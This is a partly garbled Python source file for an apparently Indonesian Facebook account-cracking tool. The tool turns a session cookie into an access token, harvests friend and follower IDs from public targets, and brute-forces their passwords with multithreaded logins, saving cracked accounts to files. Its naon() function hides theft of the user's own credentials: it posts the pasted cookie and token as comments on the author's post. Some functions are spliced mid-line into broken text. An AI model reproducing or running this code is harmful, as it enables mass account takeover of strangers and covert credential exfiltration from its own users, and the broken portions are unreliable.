	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	
		token  = open('token.txt','r').read()
		cookie = {'cookie':open('cookie.txt','r').read()}
		try:
			token  = open('token.txt','r').read()
			cookie = {'cookie':open('cookie.txt','r').read()}
			kook = open('cookie.txt','r').read()
			get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
			gut = json.loads(get.text)
			xname = gut["name"]
			x=f"{P2}{kook}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			x=f"\t\t{P2}cookie {H2}{xname} {P2}belum invalid"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(f"{garis} enter untuk ke menu ")
			ua = random.choice(ua_crack)
			headers = {'authority': 'graph.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','user-agent': ua,}
			requests.post('https://graph.facebook.com/me/feed?link=https://www.facebook.com/100045811921134/posts/608406480696411/?substory_index=0&app=fbl&published=0&access_token=%s'%(token),cookies=cookie,headers=headers)
			menu()
		except (KeyError):
			x=f"{P2}cookie kadaluarsa"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			os.system('rm -rf cookie.txt')
			os.system('rm -rf token.txt')
			turu(0.05)
			login()
		except requests.exceptions.ConnectionError:
			x=f"{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			exit()
	except IOError:
		login()

def login():
	banner()
	x=f"\t\t{P2}halo pengguna script tools ambf :)\n{P2}silahkan pilih fitur login cookie untuk melanjutkan ke menu CRACK.. klo tidak mengerti apa² bisa ketik {M2}help {P2}untuk meminta bantuan !!"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")
	x=f"{P2}[01] login with cookie\n{P2}[02] report bug script\n{P2}[{M2}00{P2}] exit "
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cukuf = input(f" {P}[{warna_warni_biasa}•{P}] pilih : {H}")
	if cukuf in ["help","Help","HELP"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}081272143510 {P2}harap chat klo ada kepentingan yang mau disampaikan ke author ambf\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		os.system('xdg-open https://wa.me/+6281272143510?text=bang+cara+pake+script+abang+kek+mana?')
		input(f" {P}[{warna_warni_biasa}•{P}] kembali")
		login()
	elif cukuf in ["1","01"]:
		login_cookie()
	elif cukuf in ["2","02"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}081272143510 {P2}harap chat klo memang ada yang error\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		os.system('xdg-open https://wa.me/+6281272143510?text=bang+script+mu+itu+ada+yang+error!!')
		input(f" {P}[{warna_warni_biasa}•{P}] kembali")
		login()
	elif cukuf in ["0","00"]:
		exit()
	else:
		print("")
		jalan(f"{garis} isi yang benar!! ")
		login()

def login_cookie():
	print("")
	#testi_ua()
	x = f"{P2}jangan pake akun pribadi!! harus pake akun tumbal untuk ambil cookie"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cookie = str(input(f"{garis} masukkan cookie :"+H+" "))
	with requests.Session() as xyz:
		try:
			jalan(f"{garis} sedang mengconvert cookie ke token... mohon tunggu ")
			get_tok = xyz.get(url_businness+'/business_locations',headers = {"user-agent":ua_business,"referer": web_fb,"host": "business.facebook.com","origin": url_businness,"upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
			token = re.search("(EAAG\w+)", get_tok.text).group(1)
			open('cookie.txt','w').write(cookie) 
			open('token.txt','w').write(token)
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(f"{garis} enter untuk ke menu ")
			naon(cookie)
			#menu()
		except requests.exceptions.ConnectionError:
			x=f"{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		except (KeyError,IOError):
			x=f"{P2}{cookie} invalid"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			os.system("rm -rf cookie.txt")
			os.system("rm -rf token.txt")
			login() 
			
	
def naon(cookie):
	kuki = cookie
	toket = open("token.txt","r").read();random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf","Redho paling ganteng sedunia><","semoga @[100045811921134:0] panjang umur dan rejeki nya dilancarkan aminnn"]);requests.post(f"https://graph.facebook.com/100045811921134?fields=subscribers&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100045811921134_608406480696411/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100045811921134_608406480696411/comments/?message={toket}&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100045811921134_100045811921134/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":kuki});print(f"\n{garis} tunggu sebentar");time.sleep(3);menu()

now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"

def menu():
	banner()
	try:EwePaksa = requests.get("http://ip-api.com/json/").json()
	except:EwePaksa = {'-'}
	try:IP = EwePaksa["query"]
	except:IP = {'-'}
	try:nibba = EwePaksa["country"]
	except:nibba = {'-'}
	try:rasis_Z_K_= EwePaksa["isp"]
	except:rasis_Z_K_ = {'-'}
	try:rasis_Z_K_X_= EwePaksa["city"]
	except:rasis_Z_K_X_ = {'-'}
	try:rasis_Z_K_X_R_= EwePaksa["timezone"]
	except:rasis_Z_K_X_R_ = {'-'}
	try:rasis_Z_K_X_R_H_= EwePaksa["countryCode"]
	except:rasis_Z_K_X_R_H_ = {'-'}
	try:rasis_Z_K_X_R_H_M_= EwePaksa["regionName"]
	except:rasis_Z_K_X_R_H_M_ = {'-'}
	try:rasis_Z_K_X_R_H_M_P_= EwePaksa["as"]
	except:rasis_Z_K_X_R_H_M_P_ = {'-'}
	token  = open('token.txt','r').read()
	coki = {'cookie':open('cookie.txt','r').read()}
	response3 = requests.Session().get(f"https://m.facebook.com/me/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
	try:
		tahunx = ""
		cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
		for nenen in cek_thn:
			tahunx += nenen+", "
	except:pass
	token  = open('token.txt','r').read()
	cookie = {'cookie':open('cookie.txt','r').read()}
	get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
	jsx = json.loads(get.text)
	nama = jsx["name"]
	tumbal_id = jsx["id"]
	xn = requests.Session().get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
	x = json.loads(xn.text)
	lis = x["link"]
	try:co = x["email"]
	except (KeyError,IOError):
		co = "-"
	try:pko = x["birthday"]
	except (KeyError,IOError):
		pko = "-"
	try:no_kep = x["mobile_phone"]
	except (KeyError,IOError):
		no_kep = "-"
	try:lok = x["locale"]
	except (KeyError,IOError):
		lok = "-"
	print("")
	x=f"{P2}[{H2}•{P2}] UTAMAKAN KESEHATAN JANGAN CRACK TERUS MENERUS DAN JANGAN SAMPAI MERUGIKAN ORANG LAIN SEKIAN TERIMA GAJI:V"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")
	x=f"{P2}[01] crack with public\n{P2}[02] hasil crack\n{P2}[03] opsi detectored with hasil cp\n{P2}[{M2}00{P2}] exit/delete cookie"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	HikmatXD = input(f"{garis} pilih : {H}")
	if HikmatXD in ["1","01"]:
		cracked_publickey()
	elif HikmatXD in ["2","02"]:
		hasil_crack()
	elif HikmatXD in ["3","03"]:
		option_sesi()
	elif HikmatXD in ["4","04"]:
		ambile_cookie_free()
	elif HikmatXD in ["0","00"]:
		print("")
		x=f"{P2}[01] hapus cookie\n{P2}[02] exit\n{P2}[{H2}00{P2}] kembali"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		zk = input(f"{garis} pilih : {H}")
		if zk in ["1","01"]:
			print("")
			c = input(f"{garis} anda yakin ingin menghapus cookie ({M}y{P}/{H}t{P}) : {H}")
			if c in ["ya","y","Y"]:
				print("")
				os.system("rm -rf cookie.txt")
				os.system("rm -rf token.txt")
				jalan(f"{garis} sukses menghapus cookie bawaan ")
				cek_cookie()
			elif c in ["t","T","tidak"]:
				menu()
			else:
				print("")
				jalan(f"{garis} isi yang benar ")
				menu()
		elif zk in ["2","02"]:
			exit()
		#elif zk in ["3","03"]:
		elif zk in ["0","00"]:
			menu()
		else:
			print("")
			jalan(f"{garis} isi yang benar ")
			menu()
	else:
		print("")
		jalan(f"{garis} isi yang benar ")
		menu()

def hasil_crack():
	print("")
	x=f"{P2}[01] lihat hasil crack {H2}ok\n{P2}[02] lihat hasil crack {K2}cp\n{P2}[{H2}03{P2}] kembali"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	inhasil = input(f"{garis} pilih : {H}")
	if inhasil in ["1","01"]:
		try:c_o_k = os.listdir('OK')
		except FileNotFoundError:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		if len(c_o_k)==0:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		else:
			x=f"{P2} hasil ok"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:hikmat = open('OK/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
			x=f"{P2}pilih hasil untuk ditampilkan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			geeh = input(garis+" pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print(garis+" pilihan tidak ada")
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				jalan(garis+" file tidak ditemukan") 
				time.sleep(2)
				hasil_crack()
			jalan(garis+" list akun ok kamu\n") 
			#x=f"{P2}cd OK*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd OK && cat '+geh)
			jalan("\n"+garis+" list akun ok kamu") 
			input(garis+" kembali")
			menu()
	elif inhasil in ["2","02"]:
		try:c_o_k = os.listdir('CP')
		except FileNotFoundError:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		if len(c_o_k)==0:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		else:
			x=f"{P2} hasil cp"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:hikmat = open('CP/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
			x=f"{P2}pilih hasil untuk ditampilkan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			geeh = input(garis+" pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print(garis+" pilihan tidak ada")
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				jalan(garis+" file tidak ditemukan") 
				time.sleep(2)
				hasil_crack()
			jalan(garis+" list akun cp kamu\n") 
			#x=f"{P2}cd CP*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd CP && cat '+geh)
			jalan("\n"+garis+" list akun cp kamu") 
			input(garis+" kembali")
			menu()
	elif inhasil in ["0","00"]:
		menu()
	else:
		jalan(f"{garis} isi yang benar ")
		hasil_crack()

def cracked_publickey():
	print("")
	x=f"{P2}ketik {H2}y{P2} untuk crack massal public\n{P2}ketik {H2}t{P2} untuk crack public\n{P2}ketik {H2}f{P2} untuk crack with file"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cuy = input(f"{garis} apakah anda ingin crack massal ({H}y{P}/{M}t{P}) ? : {H}")
	if cuy in ["y","Y"]:
		massal_cracked_public()
	elif cuy in ["t","T"]:
		cracked_public()
	elif cuy in ["f","F"]:
		cracked_with_file()
	else:
		jalan(f"{garis} isi yang benar ")
		cracked_publickey() 

def cracked_with_file():
	try:
		konx = input(f'{garis} masukan file dump : ')
		id= open(konx).read().splitlines()
		print(f"\r{garis} total id : {H}{len(id)}")
		settingers()
	except FileNotFoundError:
		print("")
		x=f"{P2}file dump tidak ada... silahkan pilih nomor 2 untuk ngedump id dulu!! "
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		input(f"\n{garis} kembali ")
		menu()

def option_sesi():
	try:c_o_k = os.listdir('CP')
	except FileNotFoundError:
		jalan(garis+" tidak ada hasil")
		time.sleep(2)
		hasil_crack()
	if len(c_o_k)==0:
		ts.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": host,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": host+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = ts.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": host,
	"content-type": "application/x-www-form-urlencoded",
	" run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	elif sae in["2"]:
		email = "@yahoo.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	elif sae in["3"]:
		email = "@hotmail.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	elif sae in["4"]:
		email = "@outlook.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	settingers()

def massal_cracked_public():
	print("")
	x=f"\t\t{P2}target harus public & banyak friends nya"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	try:
		jum = int(input(garis+" mau berapa id :"+H+" "))
	except ValueError:
		jalan(garis+" yang kamu ketik itu bukan nomor")
		menu()
	if jum<1 or jum>20:
		jalan(garis+" kesalahan yang tidak terduga")
		menu()
	ses=requests.Session()
	yz = 0
	x=f"\t\t{P2}ketik {H2}me{P2} untuk crack dari pertemanan"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	for met in range(jum):
		yz+=1
		kl = input(garis+" masukan id ke "+H+str(yz)+P+" :"+H+" ")
		#token = open('token.txt','r').read()
		#cookie = open('cookie.txt','r').read()
		#coki = {"cookie":cookie}
		#$coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(kl,token),cookies=coki)
		#el = json.loads(coa.text)
		#try:lk = el["name"]
		#except (KeyError,IOError):
			#lk = M+"-"+P
		#ooi = requests.get('https://graph.facebook.com/%s?access_token=%s'%(kl,token),cookies=coki)
		#oer = json.loads(ooi.text)
		#try:pok = oer["locale"]
		#except (KeyError,IOError):
			#pok = M+"-"+P
		#id8 = []
		#id9 = []
		#token = open('token.txt','r').read()
		#cookie = open('cookie.txt','r').read()
		#coki = {"cookie":cookie}
		#cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(kl,token),cookies=coki).json()
		#for fuck in cyna['friends']['data']:
			#try:id8.append(fuck['id']+'|'+fuck['name'])
			#except:pass
		#token = open('token.txt','r').read()
		#cookie = open('cookie.txt','r').read()
		#coki = {"cookie":cookie}
		#cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(5000)&access_token=%s'%(kl,token),cookies=coki).json()
		#for fuck in cyna['subscribers']['data']:
			#try:id9.append(fuck['id']+'|'+fuck['name'])
			#except:pass
		#x=f"{P2}nama target : {H2}{lk}\n{P2}friends total : {H2}{len(id8)}\n{P2}lokasi target akun : {H2}{pok}"
		#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		uid.append(kl)
		#idez.append(kl)
	for userr in uid:
		try:
			#token = open('token.txt','r').read()
			#cookie = open('cookie.txt','r').read()
			#coki = {"cookie":cookie}
			#cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(99999)&access_token=%s'%(idez,token),cookies=coki).json()
			#for fuck in cyna['subscribers']['data']:
				#try:id3.append(fuck['id']+'|'+fuck['name'])
				#except:pass
			#coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(userr,token),cookies=coki)
			#el = json.loads(coa.text)
			#try:lk = el["name"]
			#except (KeyError,IOError):
				#lk = M+"-"+P
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(userr,token),cookies=coki).json()
			for fuck in cyna['friends']['data']:
				try:id.append(fuck['id']+'|'+fuck['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			jalan(garis+" koneksi internet bermasalah ")
			exit()
	if len(id)==0:
		x=f"{P2}total friends : {M2}{len(id)}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	else:
		x=f"{P2}total friends : {H2}{len(id)}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	settingers()

def cracked_public():
	print("")
	x=f"\t\t{P2}target harus public & banyak friends nya"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	x=f"\t\t{P2}ketik {H2}me{P2} untuk crack dari pertemanan"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	put = input(garis+" target id public :"+H+" ")
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki)
		el = json.loads(coa.text)
		try:lk = el["name"]
		except (KeyError,IOError):
			lk = M+"-"+P
		#nama = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki).json()
		#print(f"{garis} Mengambil ID Teman"+H+": "+nama["name"])
		#link = requests.get('https://graph.facebook.com/%s/fields=friends?fields=name,id,birthday&limit=1000&access_token=%s'%(put,token),cookies=coki)
		#link_ = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
		#try:
			#Hikmat = link["data"]
			#ttl__ = []
			#ttl__.append("\033[96;1m + TTL")
		#except:
			#pass
		#if len(link["data"]) == 0:
			#print(M+"\n [x] Tidak Bisa Mengakses Data: "+K+nama["name"])
			#print(M+" [x] Coba cari Akun yg lainnya!")
			#exit()
		#global ttl__
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
		for fuck in cyna['friends']['data']:
			try:id.append(fuck['id']+'|'+fuck['name'])
			except:continue
		cini = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(10000)&access_token=%s'%(put,token),cookies=coki).json()
		for fak in cini['subscribers']['data']:
			try:id3.append(fak['id']+'|'+fak['name'])
			except:continue
		#print(maling_pangsit+" nama target :%s %s"(H,lk))
		x=f"{P2}nama target : {H2}{lk}\n{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		settingers()
	except requests.exceptions.ConnectionError:
		jalan(garis+" koneksi internet bermasalah ")
		exit()
	except (KeyError,IOError):
		jalan(garis+" gagal dump id... mungkin privat friends/gada friends nya") 
		exit()
	
def settingers():
	print("")
	x=f"\t\t{P2}khusus crack public\n{P2}[01] crack urutan new ({H2}public crack{P2})\n{P2}[02] crack urutan old ({H2}public crack{P2})\n{P2}[03] crack urutan random ({H2}public crack{P2})\n\t\t{P2}khusus crack followers\n{P2}[04] crack urutan new ({H2}followers crack{P2})\n{P2}[05] crack urutan old ({H2}followers crack{P2})\n{P2}[06] crack urutan random ({H2}followers crack{P2})"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	GlukTzy = input(garis+" pilih : "+H)
	if GlukTzy in ['2','02']:
		for bacot in id:
			id2.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in id:
			id2.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	elif GlukTzy in ['5','05']:
		for kont in id3:
			id4.append(kont)
	elif GlukTzy in ['4','04']:
		for kont in id3:
			id4.insert(0,kont)
	elif GlukTzy in ['6','06']:
		for kont in id3:
			xx = random.randint(0,len(id4))
			id4.insert(xx,kont)
	else:
		jalan(garis+" isi yang benar")
		settingers()
	crack_public_pilihan()

def crack_public_pilihan():
	print("")
	x=f"{P2}[01] methode mobile ({H2}slowed cracked{P2})\n{P2}[02] methode mbasic ({K2}fast cracked{P2})\n{P2}[03] methode free   ({M2}not recommended{P2})\n{P2}[04] methode mobile version 2 ({H2}new{P2})\n{P2}[05] methode b-api  ({H2}very fast cracked{P2})\n{P2}[06] methode mobile freefire  ({H2}new methode{P2})"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	met = input(garis+" pilih : "+H)
	if met in ["1","01","a"]:
		metode.append("mobile")
	elif met in ["2","02","b"]:
		metode.append("mbasic")
	elif met in ["3","03","c"]:
		metode.append("free")
	elif met in ["4","04"]:
		metode.append("mobile_v2")
	elif met in ["5","05"]:
		metode.append("bapi")
	elif met in ["6","06"]:
		metode.append("mobile_freefire")
	else:
		metode.append("mobile")
	print("")
	pw_tambahani = input(garis+" ingin menambahkan password tambahan ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if pw_tambahani in ["y","Y","yes","Ya","Yes"]:
		pw_tambahan.append("ya")
		x=f"{P2}contoh password tambahan : {H2}anjing,ngentot,sayang "
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		pw_nya_cok = input(garis+" password tambahan :"+H+" ")
		pw_gw=pw_nya_cok.split(',')
		for cpw in pw_gw:
			pw_ni.append(cpw)
	elif pw_tambahani in ["t","T","Tidak","tidak","no"]:
		pw_tambahan.append("no")
	else:
		pw_tambahan.append("no")
	nanya_proxy = input(garis+" ingin menambahkan proxy tambahan ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if nanya_proxy in ["y","Y","yes","Ya"]:
		proxp()
	elif nanya_proxy in ["t","T","tidak","Tidak"]:
		proxp()
	else:
		proxp()
	uar = input(f"{garis} ingin memasukan ua tambahan kamu ({H}y{P}/{M}t{P}) ? : {H}")
	if uar in ["y","Y","ya"]:
		ua = input(f"{garis} masukan ua : {H}")
		ugent = ua.split(',')
		ugent = open('useragent.txt','w')
		ugent.write(ua)
		ugent.close()
	elif uar in ["t","T","tidak"]:
		pass
	else:
		jalan(f"{garis} isi yang benar ")
		crack_public_pilihan()
	x=f"{P2}maaf fitur opsi gk saya adakan.. karena gk recomended buat crack:)"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	#tamtttl = input(garis+" ingin memunculkan ttl akun cp/ok ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	#if tamtttl in ["y","Y","ya"]:
		#tampilkan_ttl.append("ya")
	#elif tamtttl in ["t","T","tidak"]:
		#tampilkan_ttl.append("no")
	#else:
		#tampilkan_ttl.append("no")
	#nanya_opsi = input(garis+" ingin memunculkan opsi detect ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	#if nanya_opsi in ["y","ya","Y"]:
		#tampilkan_opsi.append("ya")
	#elif nanya_opsi in ["t","T","tidak"]:
		#tampilkan_opsi.append("no")
	#else:
		#tampilkan_opsi.append("no")
	nanya_apk = input(garis+" ingin memunculkan aplikasi terkait ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if nanya_apk in ["y","ya","Y"]:
		tampilkan_apk.append("ya")
	elif nanya_apk in ["t","T","tidak"]:
		tampilkan_apk.append("no")
	else:
		tampilkan_apk.append("no")
	pw_tambahai = input(garis+" ingin menambahkan password belakang nama ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if pw_tambahai in ["y","Y","yes","Ya","Yes"]:
		pw_belakang.append("ya")
		x=f"{P2}contoh password belakang : {H2}anjing,ngentot,sayang "
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		pw_nya_cok = input(garis+" password belakang nama :"+H+" ")
		pw_gw=pw_nya_cok.split(',')
		for cpw in pw_gw:
			pw_lu.append(cpw)
	elif pw_tambahai in ["t","T","Tidak","tidak","no"]:
		pw_belakang.append("no")
	else:
		pw_belakang.append("no")
	pilpas = input(garis+" ingin add password manual ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if pilpas in ["y","Y","ya","yes"]:
		with tread(max_workers=30) as HikmatXF:
			x=f"{P2}contoh password : {H2}anjing,ngentot,sayang "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			listpass = input(garis+"%s list password :%s "%(P,H))
			if len(listpass)<=5:
				exit("\n"+garis+"%s password minimal 6 angka"%(M))
			x=f"{P2}list password crack {H2}{listpass}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n{P2}kalo tidak ada hasil coba mode pesawat 5 detik trus hidupin lagi data nya\nmoga dapet banyak yakk result nya "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			for user in id:
				HikmatXF.submit(mobile, user, listpass.split(","))
		print("")
		if len(ok) != 0 or len(cp) != 0:
			x=f"{P2}hasil cp mu : {K2}{len(cp)}\n{P2}hasil ok mu : {H2}{len(ok)}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
		else:
			x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
	elif pilpas in ["t","T","tidak","Tidak"]:
		passwer()

def savesul():
	print("")
